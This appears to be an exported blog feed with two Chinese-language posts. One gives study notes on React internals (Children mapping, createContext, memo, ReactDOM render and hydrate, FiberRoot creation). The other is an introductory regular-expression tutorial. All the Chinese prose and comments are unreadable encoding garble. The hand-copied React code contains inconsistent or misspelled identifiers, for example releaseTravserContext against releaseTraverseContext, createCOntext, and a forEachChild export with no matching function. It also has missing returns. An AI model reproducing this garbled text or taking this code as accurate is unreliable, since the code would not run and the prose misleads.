getPooledTraverseContext(mapResult,keyPrefix,mapFunction,mapContext)&#123; if(traverseContextPool.length)&#123; const traverseContext = traverseContextPool.pop(); traverseContext.result = mapResult; traverseContext.keyPrefix = keyPrefix; traverseContext.func = mapFunction; traverseContext.context = mapContext; traverseContext.count = 0; return traverseContext; &#125;else&#123; return&#123; result:mapResult, keyPrefix:keyPrefix, func:mapFunction, context:mapContext, count:0 &#125; &#125;&#125;// é‡Šæ”¾å¯¹è±¡å±žæ€§ï¼Œå°‘äºŽæŒ‡å®šé•¿åº¦æ—¶ï¼Œå°†å¯¹è±¡push å¯¹è±¡æ± function releaseTravserContext(traverseContext)&#123; traverseContext.result = null; traverseContext.keyPrefix = null; traverseContext.func = null; traverseContext.context = null; traverseContext.count = 0; if(traverseContextPool.length &lt; POOL_SIZE)&#123; traverseContextPool.push(traverseContext) &#125;&#125;// æ ¸å¿ƒfunction traverseAllChildrenImpl( children, nameSoFar, callback, traverseContext,) &#123; const type = typeof children; if (type === &apos;undefined&apos; || type === &apos;boolean&apos;) &#123; children = null; &#125; let invokeCallback = false; if (children === null) &#123; invokeCallback = true; &#125; else &#123; switch (type) &#123; case &apos;string&apos;: case &apos;number&apos;: invokeCallback = true; break; case &apos;object&apos;: switch (children.$$typeof) &#123; case REACT_ELEMENT_TYPE: case REACT_PORTAL_TYPE: invokeCallback = true; &#125; &#125; &#125; if (invokeCallback) &#123; callback( traverseContext, children, nameSoFar === &apos;&apos; ? SEPARATOR + getComponentKey(children, 0) : nameSoFar, ); return 1; &#125; let child; let nextName; let subtreeCount = 0; const nextNamePrefix = nameSoFar === &apos;&apos; ? SEPARATOR : nameSoFar + SUBSEPARATOR; if (Array.isArray(children)) &#123; for (let i = 0; i &lt; children.length; i++) &#123; child = children[i]; nextName = nextNamePrefix + getComponentKey(child, i); subtreeCount += traverseAllChildrenImpl( child, nextName, callback, traverseContext, ); &#125; &#125; else &#123; const iteratorFn = getIteratorFn(children); if (typeof iteratorFn === &apos;function&apos;) &#123; const iterator = iteratorFn.call(children); let step; let ii = 0; while (!(step = iterator.next()).done) &#123; child = step.value; nextName = nextNamePrefix + getComponentKey(child, ii++); subtreeCount += traverseAllChildrenImpl( child, nextName, callback, traverseContext, ); &#125; &#125; else if (type === &apos;object&apos;) &#123; let addendum = &apos;&apos;; const childrenString = &apos;&apos; + children; invariant( false, &apos;Objects are not valid as a React child (found: %s).%s&apos;, childrenString === &apos;[object Object]&apos; ? &apos;object with keys &#123;&apos; + Object.keys(children).join(&apos;, &apos;) + &apos;&#125;&apos; : childrenString, addendum, ); &#125; &#125; return subtreeCount;&#125;function traverseAllChildren(children,callback,traverseContext)&#123; if(children === null)&#123; return 0; &#125; return traverseAllChildrenImpl(children,&apos;&apos;,callback,traverseContext)&#125;function getComponentKey(component,index)&#123; if( typeof component === &apos;object&apos; &amp;&amp; component !== null &amp;&amp; component.key != null )&#123; return escape(component.key); &#125; return index.toString(36);&#125;function forEachSingleChild(bookKeeping,child,name)&#123; const &#123; func, context &#125; = bookKeeping; func.call(context,child,bookKeeping.count++);&#125;function forEachChildren(children, forEachFunc, forEachContext) &#123; if (children == null) &#123; return children; &#125; const traverseContext = getPooledTraverseContext( null, null, forEachFunc, forEachContext, ); traverseAllChildren(children, forEachSingleChild, traverseContext); releaseTraverseContext(traverseContext);&#125;function mapSingleChildIntoContext(bookKeeping, child, childKey) &#123; const &#123;result, keyPrefix, func, context&#125; = bookKeeping; let mappedChild = func.call(context, child, bookKeeping.count++); if (Array.isArray(mappedChild)) &#123; mapIntoWithKeyPrefixInternal(mappedChild, result, childKey, c =&gt; c); &#125; else if (mappedChild != null) &#123; if (isValidElement(mappedChild)) &#123; mappedChild = cloneAndReplaceKey( mappedChild, keyPrefix + (mappedChild.key &amp;&amp; (!child || child.key !== mappedChild.key) ? escapeUserProvidedKey(mappedChild.key) + &apos;/&apos; : &apos;&apos;) + childKey, ); &#125; result.push(mappedChild); &#125;&#125;function mapIntoWithKeyPrefixInternal(children,array,prefix,func,context)&#123; let escapedPrefix = &apos;&apos;; if(prefix != null)&#123; escapedPrefix = escapeUserProvidedKey(prefix)+&apos;/&apos;; &#125; const traverseContext = getPooledTraverseContext( array, escapedPrefix, func, context ) traverseAllChildren(children,mapSingleChildIntoContext,traverseContext); releaseTraverseContext(traverseContext);&#125;function mapChildren(children,func,context)&#123; if(children == null)&#123; return children; &#125; const result = []; mapIntoWithKeyPrefixInternal(children,result,null,func,context); return result;&#125;function countChildren(children)&#123; return traverseAllChildren(children,()=&gt;null,null);&#125;function toArray(children)&#123; const result = []; mapIntoWithKeyPrefixInternal(children,result,null,child =&gt; child) return result;&#125;function onlyChild(children) &#123; invariant( isValidElement(children), &apos;React.Children.only expected to receive a single React element child.&apos;, ); return children;&#125;export &#123; forEachChild as forEach, mapChildren as map, countChildren as count, onlyChild as only, toArray,&#125; ä¸»è¦æ–¹æ³•æµç¨‹å›¾ï¼š graph TD A(å¼€å§‹) contextPool(contextPool) mapIntoWithKeyPrefixInternal(mapIntoWithKeyPrefixInternal) traverseAllChildren(traverseAllChildren) traverseAllChildrenImpl(traverseAllChildrenImpl) mapSingleChildrenContext(mapSingleChildrenContext) æ˜¯å¦å¤šä¸ªèŠ‚ç‚¹{æ˜¯å¦å¤šä¸ªèŠ‚ç‚¹} isArray{isArray} å¾ªçŽ¯æ¯ä¸ªèŠ‚ç‚¹((å¾ªçŽ¯æ¯ä¸ªèŠ‚ç‚¹)) å¯¹æ¯ä¸ªèŠ‚ç‚¹è°ƒç”¨mapFuncè¿”å›žmapä¹‹åŽçš„èŠ‚ç‚¹(å¯¹æ¯ä¸ªèŠ‚ç‚¹è°ƒç”¨mapFuncè¿”å›žmapä¹‹åŽçš„èŠ‚ç‚¹) å¾€resultä¸­æŽ¨å…¥cloneèŠ‚ç‚¹å¹¶æ›¿æ¢key(å¾€resultä¸­æŽ¨å…¥cloneèŠ‚ç‚¹å¹¶æ›¿æ¢key) A --> mapIntoWithKeyPrefixInternal mapIntoWithKeyPrefixInternal -. å¼€å§‹çš„æ—¶å€™èŽ·å– .-> contextPool mapIntoWithKeyPrefixInternal -. ç»“æŸä¹‹åŽå½’è¿˜ .-> contextPool mapIntoWithKeyPrefixInternal --> traverseAllChildren traverseAllChildren --> traverseAllChildrenImpl traverseAllChildrenImpl --> æ˜¯å¦å¤šä¸ªèŠ‚ç‚¹ æ˜¯å¦å¤šä¸ªèŠ‚ç‚¹ --Y--> å¾ªçŽ¯æ¯ä¸ªèŠ‚ç‚¹ æ˜¯å¦å¤šä¸ªèŠ‚ç‚¹ --N--> mapSingleChildrenContext å¾ªçŽ¯æ¯ä¸ªèŠ‚ç‚¹ --> traverseAllChildrenImpl mapSingleChildrenContext --> å¯¹æ¯ä¸ªèŠ‚ç‚¹è°ƒç”¨mapFuncè¿”å›žmapä¹‹åŽçš„èŠ‚ç‚¹ å¯¹æ¯ä¸ªèŠ‚ç‚¹è°ƒç”¨mapFuncè¿”å›žmapä¹‹åŽçš„èŠ‚ç‚¹ --> isArray isArray --Y--> mapIntoWithKeyPrefixInternal isArray --N--> å¾€resultä¸­æŽ¨å…¥cloneèŠ‚ç‚¹å¹¶æ›¿æ¢key ReactContext.js12345678910111213141516171819export function createCOntext(defaultValue,calculateChangedBits)&#123; if(calculateChangedBits === undefined)&#123; calculateChangedBits = null; &#125; const context = &#123; $$typeof:REACT_CONTEXT_TYPE, _calculateChangeBits:calculateChangeBits, _currentValue:defaultValue, _currentValue2:defaultValue, Provider:null, Consumer:null &#125; context.Provider = &#123; $$typeof:REACT_PROVIDER_TYPE, _context:context, &#125; context.Consumer = context; return context;&#125; memo.js12345678910export default function memo( type: React$ElementType, compare?: (oldProps: Props, newProps: Props) =&gt; boolean, )&#123; return&#123; $$typeof:REACT_MEMO_TYPE, type, compare:compare === undefined ? null : compare, &#125;&#125; åˆ›å»ºæ›´æ–°çš„æ–¹å¼ä¸»è¦æ˜¯ä¸‹é¢çš„çŸ¥è¯†ç‚¹ï¼š ReactDOM.renderã€ReactDOM.renderã€setStateã€forceUpdate æ­¥éª¤ï¼š åˆ›å»º ReactRoot åˆ›å»º FiberRoot å’Œ RootFiber åˆ›å»ºæ›´æ–° ReactDOM.js12345678910111213141516171819202122232425262728293031323334// ReactDOMconst ReactDOM = &#123; createPortal, findDOMNode( componentOrElement, )&#123; if (componentOrElement == null) &#123; return null; &#125; if (componentOrElement.nodeType === ELEMENT_NODE) &#123; return componentOrElement; &#125; &#125;, // REACTElememt,DOMåŒ…è£¹èŠ‚ç‚¹ï¼Œå›žè°ƒæ–¹æ³• hydrate(element,container,callback)&#123; return legacyRenderSubtreeIntoContainer( null, element, container, // åè°ƒæ›´æ–°çš„é€‰é¡¹ true, callback ) &#125;, render(element,container,callback)&#123; return legacyRenderSubtreeIntoContainer( null, element, container, false, callback ) &#125;&#125; render ä¸Ž hydrate æ–¹æ³•éƒ½å¯ä»¥ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼ŒåŒ…æ‹¬ ReactElementã€DOMåŒ…è£¹èŠ‚ç‚¹å’Œæ¸²æŸ“ç»“æŸåŽæ‰§è¡Œçš„å›žè°ƒæ–¹æ³•ï¼Œè¿”å›ž legacyRenderSubtreeIntoContainer æ–¹æ³•æ‰§è¡Œçš„ç»“æžœã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function legacyRenderSubtreeIntoContainer( parentComponent, children, container, forceHydrate, callback)&#123; let root; if(!root)&#123; root = container._reactRootContainer = legacyCreateRootFromDOMContainer( container, forceHydrate, ) &#125; &#125;function legacyCreateRootFromDOMContainer( container, forceHydrate,)&#123; const shouldHydrate = forceHydrate || shouldHydrateDueToLegacyHeuristic(container); // æ²¡æœ‰ssrçš„æƒ…å†µ if(!shouldHydrate)&#123; let rootSibling; while((rootSibling = container.lastChild))&#123; // åˆ é™¤ container ä¸‹é¢çš„æ‰€æœ‰å­èŠ‚ç‚¹ container.removeChild(rootSibling) &#125; &#125; const isConcurrent = false; return new ReactRoot(container,isConcurrent,shouldHydrate) &#125;function shouldHydrateDueToLegacyHeuristic()&#123; const rootElement = getReactRootElementInContainer(container); return !!( rootElement &amp;&amp; // æ™®é€šelementèŠ‚ç‚¹ rootElement.nodeType === ELEMENT_NODE &amp;&amp; // data-reactroot è€ç‰ˆæœ¬ssrçš„èŠ‚ç‚¹ rootElement.hasAttribute(ROOT_ATTRIBUTE_NAME) )&#125;function getReactRootElementInContainer(container)&#123; if(!container)&#123; return null; &#125; // åˆ¤æ–­èŠ‚ç‚¹ if(container.nodeType === DOCUMENT_NODE)&#123; return container.documentElement; &#125;else&#123; return container.firstChild; &#125;&#125; å…ˆåˆ¤æ–­ root æ˜¯å¦ä¸å­˜åœ¨ï¼Œä¸å­˜åœ¨è°ƒç”¨legacyCreateRootFromDOMContainerï¼Œä¼ å…¥ container,forceHydrateä¸¤ä¸ªå‚æ•°ã€‚legacyCreateRootFromDOMContainerå‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª ReactRootï¼Œè€Œ forceHydrateå¸ƒå°”ç±»åž‹å‚æ•°åœ¨ hydrate ä¼ å…¥ true,åœ¨ render é‡Œé¢ä¼ å…¥ falseã€‚å‰è€…æ˜¯æœåŠ¡å™¨æ¸²æŸ“ï¼ŒåŽè€…æ˜¯å®¢æˆ·ç«¯æ¸²æŸ“ã€‚æœåŠ¡å™¨æ¸²æŸ“å½“æœåŠ¡å™¨å‘ˆçŽ°æ ‡è®°çš„èŠ‚ç‚¹ï¼ŒReact ä¼šä¿ç•™å®ƒå¹¶é™„åŠ äº‹ä»¶å¤„ç†ç¨‹åºï¼Œä»Žè€Œå…·æœ‰é«˜æ€§èƒ½çš„é¦–å±åŠ è½½ï¼Œå®¢æˆ·ç«¯æ¸²æŸ“å½“åˆå§‹DOMä¸Žå½“å‰ DOM å­˜åœ¨å·®å¼‚ï¼Œåˆ™å¯èƒ½ä¼šæ›´æ”¹èŠ‚ç‚¹ã€‚å¯ä»¥çœ‹åˆ° å¦‚æžœæ˜¯ falseä¼š container.removeChild(rootSibling) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function ReactRoot( container, isConcurrent, hydrate)&#123; const root = DOMRender.createContainer(container,isConcurrent,hydrate); this._internalRoot = root; &#125;// react-reconciler/inline.domfunction createContainer( containerInfo, isConcurrent, hydrate)&#123; // åˆ›å»º FiberRoot return createFiberRoot(container,isConcurrent,hydrate) &#125;// ReactFiberRootexport function createFiberRoot( containerInfo, isConcurrent, hydrate,): FiberRoot &#123; // const uninitializedFiber = createHostRootFiber(isConcurrent); let root; if (enableSchedulerTracing) &#123; root = &#123; current: uninitializedFiber, containerInfo: containerInfo, pendingChildren: null, earliestPendingTime: NoWork, latestPendingTime: NoWork, earliestSuspendedTime: NoWork, latestSuspendedTime: NoWork, latestPingedTime: NoWork, didError: false, pendingCommitExpirationTime: NoWork, finishedWork: null, timeoutHandle: noTimeout, context: null, pendingContext: null, hydrate, nextExpirationTimeToWorkOn: NoWork, expirationTime: NoWork, firstBatch: null, nextScheduledRoot: null, interactionThreadID: unstable_getThreadID(), memoizedInteractions: new Set(), pendingInteractionMap: new Map(), &#125;; &#125; else &#123; root = &#123; current: uninitializedFiber, containerInfo: containerInfo, pendingChildren: null, earliestPendingTime: NoWork, latestPendingTime: NoWork, earliestSuspendedTime: NoWork, latestSuspendedTime: NoWork, latestPingedTime: NoWork, didError: false, pendingCommitExpirationTime: NoWork, finishedWork: null, timeoutHandle: noTimeout, context: null, pendingContext: null, hydrate, nextExpirationTimeToWorkOn: NoWork, expirationTime: NoWork, firstBatch: null, nextScheduledRoot: null, &#125;; uninitializedFiber.stateNode = root; return root; &#125;]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>æºç </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2F2019-06-25-regExp.html</url>
    <content type="text"><![CDATA[æœ€è¿‘è¿™æ®µæ—¶é—´å› ä¸ºèµ¶é¡¹ç›®ï¼Œä¸€ç›´æ²¡æœ‰æ›´æ–°åšå®¢ã€‚ç²¾é€šæ­£åˆ™è¿™æœ¬ä¹¦ä¸€å¹´å‰ç¿»é˜…è¿‡è¿‡ä¸€äº›ã€‚ç”¨åˆ°çš„åœ°æ–¹ä¸å¤šï¼Œä¾¿å¾ˆå¿«å°±å¿˜è®°äº†ã€‚ä»Šå¿™é‡ŒæŠ½ç©ºå¤ä¹ ä¸€ä¸‹æ­£åˆ™ï¼Œåœ¨é¡¹ç›®ä¸­ä¹Ÿä¼šæœ‰æ‰€ç”¨åˆ°ã€‚ä¸»è¦æ˜¯è·Ÿéšæ­£åˆ™è¡¨è¾¾å¼30åˆ†é’Ÿå…¥é—¨æ•™ç¨‹ï¼Œå†ç»“åˆ JS ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œå¤ä¹ ã€‚ æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰ç¼–å†™å¤„ç†å­—ç¬¦ä¸²çš„ç¨‹åºæˆ–è€…ç½‘é¡µæ—¶å€™ï¼Œç»å¸¸ä¼šæœ‰æŸ¥æ‰¾ç¬¦åˆå¤æ‚è§„åˆ™çš„å­—ç¬¦ä¸²çš„éœ€è¦ã€‚æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯ç”¨äºŽæè¿°è¿™äº›è§„ã€‚å³è®°å½•æ–‡æœ¬è§„åˆ™çš„ä»£ç ã€‚ å…¥é—¨åœ¨ä¸€ç¯‡è‹±æ–‡å°è¯´ä¸­æŸ¥æ‰¾ hiï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™ hiã€‚å®ƒå¯ä»¥ç²¾ç¡®åŒ¹é…è¿™æ ·çš„å­—ç¬¦ä¸²ï¼šç”±ä¸¤ä¸ªå­—ç¬¦ç»„æˆï¼Œå‰ä¸€ä¸ªå­—ç¬¦æ˜¯ hï¼ŒåŽä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ iã€‚é€šå¸¸ï¼Œå¤„ç†æ­£åˆ™è¡¨è¾¾å¼çš„å·¥å…·ä¼šæä¾›ä¸€ä¸ªå¿½ç•¥å¤§å°å†™çš„é€‰é¡¹ï¼Œå¦‚æžœé€‰ä¸­äº†è¿™ä¸ªé€‰é¡¹ï¼Œå¯ä»¥åŒ¹é… hiã€HIã€Hiã€hIè¿™å››ç§æƒ…å†µä¸­çš„ä»»æ„çš„ä¸€ç§ã€‚ hiè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿä¼šåŒ¹é… himã€historyã€highç­‰ï¼Œå¦‚æžœè¦ç²¾ç¡®æŸ¥æ‰¾åˆ° hiè¿™ä¸ªå•è¯çš„è¯ï¼Œåº”è¯¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ \bhi\bã€‚ \bæ˜¯æ­£åˆ™è¡¨è¾¾å¼è§„å®šä¸€ä¸ªç‰¹æ®Šä»£ç ï¼ˆå…ƒå­—ç¬¦ï¼‰ï¼Œä»£è¡¨ç€å•è¯çš„å¼€å¤´æˆ–è€…ç»“å°¾ï¼Œä¹Ÿå°±æ˜¯å•è¯çš„åˆ†ç•Œå¤„ã€‚è‹±æ–‡çš„å•è¯ä¸€èˆ¬æ˜¯ç”±ç©ºæ ¼ï¼Œæ ‡ç‚¹ç¬¦å·æˆ–è€…æ¢è¡Œç¬¦æ¥åˆ†éš”çš„ï¼Œä½†æ˜¯ \bå¹¶ä¸åŒ¹é…è¿™äº›å•è¯åˆ†éš”å­—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œå®ƒåªåŒ¹é…ä¸€ä¸ªä½ç½®ã€‚ å¦‚æžœè¦æ‰¾åˆ°æ˜¯ hiåŽé¢ä¸è¿œå¤„è·Ÿç€ä¸€ä¸ª Lucyï¼Œå°±è¦ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ \bhi\b.*\bLucy\bã€‚è¿™é‡Œçš„ .æ˜¯ä¸€ä¸ªå…ƒå­—ç¬¦ï¼ŒåŒ¹é…é™¤äº†æ¢è¡Œç¬¦å¤–çš„ä»»æ„å­—ç¬¦ã€‚*åŒæ ·æ˜¯å…ƒå­—ç¬¦ï¼Œä¸è¿‡å®ƒä»£è¡¨çš„ä¸æ˜¯å­—ç¬¦ï¼Œä¹Ÿä¸æ˜¯ä½ç½®ã€‚è€Œæ˜¯æ•°é‡ï¼Œå®ƒæŒ‡å®š *å‰è¾¹çš„å†…å®¹å¯ä»¥è¿žç»­é‡å¤ä½¿ç”¨ä»»æ„æ¬¡ä»¥ä½¿æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¾—åˆ°åŒ¹é…ã€‚å› æ­¤ .*è¿žåœ¨ä¸€èµ·å°±æ„å‘³ç€ä»»æ„æ•°é‡çš„ä¸åŒ…æ‹¬æ¢è¡Œçš„å­—ç¬¦ã€‚çŽ°åœ¨ \bhi\b.*\bLucy\bçš„æ„æ€å°±æ˜¯ï¼šå…ˆæ˜¯ä¸€ä¸ªå•è¯hiï¼Œç„¶åŽæ˜¯ä»»æ„ä¸ªä»»æ„å­—ç¬¦ï¼ˆä½†ä¸èƒ½æ˜¯æ¢è¡Œï¼‰ï¼Œæœ€åŽæ˜¯ Lucyæ•´ä¸ªå•è¯ã€‚ å¦‚æžœä½¿ç”¨å…¶ä»–å…ƒå­—ç¬¦ï¼Œå¯ä»¥æž„é€ æ›´å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ 12345670\d\d-\d\d\d\d\d\d\d\d# ä»¥ 0 å¼€å¤´ï¼Œç„¶åŽæ˜¯ä¸¤ä¸ªæ•°å­—ï¼Œç„¶åŽæ˜¯ä¸€ä¸ªè¿žå­—ç¬¦'-'ï¼Œæœ€åŽæ˜¯8ä¸ªæ•°å­—ï¼ˆä¹Ÿå°±æ˜¯ä¸­å›½çš„ç”µè¯å·ç ï¼Œåªèƒ½åŒ¹é…åŒºå·æ˜¯3ä½çš„æƒ…å†µï¼‰# \d æ˜¯ä¸€ä¸ªæ–°çš„å…ƒå­—ç¬¦ã€‚åŒ¹é…ä¸€ä¸ªæ•°å­—ã€‚'-'ä¸æ˜¯å…ƒå­—ç¬¦ï¼ŒåªåŒ¹é…å®ƒæœ¬èº«â€”â€”è¿žå­—ç¬¦ï¼ˆæˆ–è€…å‡å·ï¼Œæˆ–è€…ä¸­æ¨ªçº¿ç­‰ï¼‰# ç®€åŒ–0\d&#123;2&#125;-d&#123;8&#125;# \d åŽé¢&#123;2&#125; å’Œ &#123;8&#125;çš„æ„æ€å¿…é¡»è¿žç»­é‡å¤åŒ¹é…2ï¼ˆ8ï¼‰æ¬¡ å…ƒå­—ç¬¦å¸¸ç”¨çš„å…ƒå­—ç¬¦ ä»£ç  è¯´æ˜Ž ç›¸å½“äºŽ . åŒ¹é…æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦ \w åŒ¹é…å­—æ¯æˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿æˆ–æ±‰å­— \s åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ï¼ˆTabï¼‰ã€æ¢è¡Œç¬¦ï¼Œä¸­æ–‡å…¨è§’ç©ºæ ¼ï¼‰ \d åŒ¹é…æ•°å­— \b åŒ¹é…å•è¯çš„å¼€å§‹æˆ–è€…ç»“æŸ ^ åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ $ åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸ å…ƒå­—ç¬¦ ^å’Œ $éƒ½åŒ¹é…ä¸€ä¸ªä½ç½®ï¼Œè¿™å’Œ \bæœ‰ç‚¹ç±»ä¼¼ã€‚^åŒ¹é…æƒ³è¦ç”¨æ¥æŸ¥æ‰¾çš„å­—ç¬¦ä¸²çš„å¼€å¤´ï¼Œ$åŒ¹é…ç»“å°¾ã€‚ \d+åŒ¹é…1ä¸ªæˆ–è€…æ›´å¤šè¿žç»­çš„æ•°å­—ã€‚+æ˜¯å’Œ *ç±»ä¼¼çš„å…ƒå­—ç¬¦ï¼Œä¸åŒçš„æ˜¯ *åŒ¹é…é‡å¤ä»»æ„æ¬¡ï¼ˆå¯èƒ½æ˜¯0æ¬¡ï¼‰ï¼Œè€Œ +åˆ™åŒ¹é…é‡å¤1æ¬¡æˆ–è€…æ›´å¤šæ¬¡ã€‚ \b\w{6}\båŒ¹é…åˆšå¥½ 6ä¸ªå­—ç¬¦çš„å•è¯ \d{5,12} è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²é‡Œé¢åŒ…å« 5 åˆ° 12 è¿žç»­ä½æ•°å­—ï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²æ˜¯ 5 åˆ° 12 ä½æ•°å­— ^\d{5,12}$åˆ™æ˜¯ç²¾ç¡®åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²å°±æ˜¯ 5 åˆ° 12 ä½æ•°å­— å­—ç¬¦è½¬ä¹‰å¦‚æžœæƒ³è¦æŸ¥æ‰¾å…ƒå­—ç¬¦æœ¬èº«çš„è¯ï¼Œæ¯”å¦‚æŸ¥æ‰¾.æˆ–è€… *å°±éœ€è¦è½¬ä¹‰ï¼Œ\å¯ä»¥æ¥å–æ¶ˆè¿™äº›å­—ç¬¦çš„ç‰¹æ®Šæ„ä¹‰ 12345678# æŸ¥æ‰¾ .\.# æŸ¥æ‰¾ *\* # æŸ¥æ‰¾ \\\ é‡å¤ä¸‹é¢æ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­æ‰€æœ‰é™å®šç¬¦ï¼ˆæŒ‡å®šæ•°é‡çš„ä»£ç ï¼‰ ä»£ç /è¯­æ³• è¯´æ˜Ž * é‡å¤0æ¬¡æˆ–è€…æ›´å¤šæ¬¡ + é‡å¤1æ¬¡æˆ–è€…æ›´å¤šæ¬¡ ï¼Ÿ é‡å¤0æ¬¡æˆ–è€…1æ¬¡ {n} é‡å¤næ¬¡ {n,} é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡ {n,m} é‡å¤næ¬¡åˆ°mæ¬¡ Windows\d+ åŒ¹é… WindowsåŽé¢è·Ÿ1ä¸ªæˆ–è€…è·Ÿå¤šæ•°å­— ^\w+åŒ¹é…ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå•è¯ï¼ˆæˆ–è€…æ•´ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå•è¯ï¼‰ å­—ç¬¦ç±»è¦æƒ³æŸ¥æ‰¾æ•°å­—ã€å­—æ¯æˆ–è€…æ•°å­—ï¼Œç©ºç™½æ˜¯å¾ˆç®€å•çš„ï¼Œå› ä¸ºå·²ç»æœ‰å¯¹åº”çš„è¿™äº›å­—ç¬¦é›†åˆçš„å…ƒå­—ç¬¦ï¼Œä½†æ˜¯æƒ³åŒ¹é…æ²¡æœ‰é¢„å®šå­—ç¬¦çš„å­—ç¬¦é›†åˆï¼ˆæ¯”å¦‚å…ƒéŸ³å­—æ¯ a/e/i/o/uï¼‰ã€‚ åªéœ€è¦åœ¨æ–¹æ‹¬å·ä¸­åˆ—å‡ºå®ƒä»¬å°±å¯ä»¥äº†,[aeiou]å°±åŒ¹é…ä»»ä½•ä¸€ä¸ªè‹±æ–‡å…ƒéŸ³å­—æ¯ï¼Œ[.?!]åŒ¹é…æ ‡ç‚¹ç¬¦å·ï¼ˆ.æˆ–?æˆ–!ï¼‰ ä¹Ÿå¯ä»¥è½»æ¾æŒ‡å®šä¸€ä¸ªå­—ç¬¦èŒƒå›´ï¼Œ[0-9]çš„å«ä¹‰å’Œ \dæ˜¯å®Œå…¨ä¸€è‡´çš„ï¼šä¸€ä¸ªæ•°å­—ã€‚ [a-z0-9A-Z]ä¹Ÿå®Œå…¨ç­‰åŒäºŽ \wï¼ˆå¦‚æžœå€¼è€ƒè™‘è‹±æ–‡çš„è¯ï¼‰ æ€è€ƒï¼š \(?0\d{2}[) -]?\d{8} ä¸Šé¢çš„è¡¨è¾¾å¼ï¼Œå¯ä»¥åŒ¹é…å‡ ç§æ ¼å¼çš„ç”µè¯å·ç ï¼Œåƒï¼ˆ010ï¼‰88888888ï¼Œæˆ–è€…010-88888888ã€‚å®ƒé¦–å…ˆæ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œå®ƒèƒ½å‡ºçŽ°0æ¬¡æˆ–è€…1æ¬¡ï¼ˆï¼Ÿï¼‰,ç„¶åŽæ˜¯ä¸€ä¸ª0ï¼ŒåŽé¢è·Ÿç€ä¸¤ä¸ªæ•°å­—ï¼ˆd{2}ï¼‰ï¼Œç„¶åŽæ˜¯ï¼‰æˆ–è€…-æˆ–è€…ç©ºæ ¼ä¸­çš„ä¸€ä¸ªï¼Œå®ƒå‡ºçŽ°1æ¬¡æˆ–è€…ä¸å‡ºçŽ°ï¼Œæœ€åŽæ˜¯8ä¸ªæ•°å­—ã€‚ åˆ†æžæ¡ä»¶ä¸Šé¢æ€è€ƒé¢˜ï¼Œå…¶å®žä¹Ÿå¯ä»¥åŒ¹é… 010)8888888æˆ–è€… ï¼ˆ010-88888888 è¿™æ ·ä¸æ­£ç¡®çš„æ ¼å¼ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦ç”¨åˆ°åˆ†æžæ¡ä»¶ã€‚æ­£åˆ™è¡¨è¾¾å¼é‡Œé¢çš„åˆ†æžæ¡ä»¶æ˜¯æœ‰å‡ ç§è§„åˆ™çš„ã€‚å¦‚æžœæ»¡è¶³å…¶ä¸­ä»»æ„ä¸€ä¸ªè§„åˆ™åº”è¯¥éƒ½å½“æˆåŒ¹é…ï¼Œå…·ä½“çš„æ–¹æ³•æ˜¯ç”¨ |æŠŠä¸åŒçš„è§„åˆ™éƒ½åˆ†éš”å¼€ã€‚ 12345670\d&#123;2&#125;-\d&#123;8&#125;|0\d&#123;3&#125;-d&#123;7&#125;# è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥åŒ¹é…ä¸¤ç§è¿žå­—ç¬¦åˆ†éš”çš„ç”µè¯å·ç ï¼šä¸€ç§æ˜¯ä¸‰ä½åŒºå·çš„ï¼Œ8ä½æœ¬åœ°å·ã€‚å¦ä¸€ç§æ˜¯4ä½åŒºå·çš„ï¼Œ7ä¸ªæœ¬åœ°å·çš„\(0\d&#123;2&#125;\)[- ]?\d&#123;8&#125;|0\d&#123;2&#125;[- ]?\d&#123;8&#125;# è¿™ä¸ªè¡¨è¾¾å¼åŒ¹é…3ä½åŒºå·çš„ç”µè¯å·ç ï¼Œå…¶ä¸­åŒºå·å¯ä»¥ç”¨å°æ‹¬å·æ‹¬èµ·æ¥ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨ï¼ŒåŒºå·ä¸Žæœ¬åœ°å·é—´å¯ä»¥ç”¨è¿žå­—å·æˆ–ç©ºæ ¼é—´éš”ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰é—´éš”ã€‚å¯ä»¥è¯•è¯•ç”¨åˆ†æ”¯æ¡ä»¶æŠŠè¿™ä¸ªè¡¨è¾¾å¼æ‰©å±•æˆæ”¯æŒ4ä½åŒºå·çš„\d&#123;5&#125;-\d&#123;4&#125;|\d&#123;5&#125;# 